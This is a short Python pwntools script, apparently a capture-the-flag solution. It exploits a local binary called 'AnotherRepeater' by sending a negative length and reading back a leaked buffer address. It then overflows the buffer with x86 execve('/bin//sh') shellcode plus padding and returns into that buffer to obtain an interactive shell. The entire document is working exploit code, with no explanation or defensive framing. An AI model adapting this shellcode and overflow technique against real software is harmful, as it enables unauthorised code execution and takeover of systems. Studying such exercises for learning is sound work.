from pwn import *

io = process('AnotherRepeater')
shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'

io.recvuntil('want to reapeat?\n')
io.sendline('-1')
read_buffer_addr = int(io.recv(8), 16)
payload = shellcode
payload += (0xcd3c - 0xc91d - len(payload)) * 'a' + p32(read_buffer_addr)
io.send(payload)

io.interactive()